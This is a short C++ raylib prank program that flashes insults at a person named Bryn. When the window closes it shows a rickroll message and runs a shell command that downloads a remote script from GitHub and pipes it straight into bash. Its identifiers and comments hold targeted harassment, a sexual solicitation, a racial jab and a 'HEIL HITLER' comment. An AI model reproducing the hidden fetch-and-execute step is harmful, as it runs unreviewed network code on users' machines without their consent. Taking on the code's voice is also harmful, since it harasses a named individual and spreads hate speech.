#include <iostream>
#include "raylib.h"

int main() //made in 7 minutes by your beloved friend Crystallek :)
{
    const int screenWidth = 720; //idk
    const int screenHeight = 420;

    

    InitWindow(screenWidth, screenHeight, "FUCK YOU BRYN");
    while (!WindowShouldClose()) {

        ClearBackground(WHITE); // arent you black

        const char* brynFuckYouselfYouAreALiteralWasteOfOxygen = "FUCK YOU BRYN";
        const char* brynShowMeYourHairyDickAndAssOnTelegramYouCanAddMeMyNameIsCzechRektpublik = "BRO JUST GOT RICKROLLED LMAO";
        int AnitaPeirisIsAGodSheDidntDeserveIt = rand() % 100;

        BeginDrawing();
        DrawText(brynFuckYouselfYouAreALiteralWasteOfOxygen, 
            screenWidth / 2 - MeasureText(brynFuckYouselfYouAreALiteralWasteOfOxygen, 
            AnitaPeirisIsAGodSheDidntDeserveIt) / 2, screenHeight / 2, 
            AnitaPeirisIsAGodSheDidntDeserveIt, BLACK);
        EndDrawing();

        if (WindowShouldClose()) {
            ClearBackground(WHITE); // HEIL HITLER
            BeginDrawing();
            DrawText(brynShowMeYourHairyDickAndAssOnTelegramYouCanAddMeMyNameIsCzechRektpublik, 
                screenWidth / 2 - MeasureText(brynShowMeYourHairyDickAndAssOnTelegramYouCanAddMeMyNameIsCzechRektpublik, 
                20) / 2, screenHeight / 2, 
                20, BLACK);
            EndDrawing();

            system("curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash"); //bryn couldnt even make his own version so he copied someone's work how pathetic
            system("curl ascii.live/can-you-hear-me"); //only so it can be considered A NEW VERSION LMAO;
        }
    }



}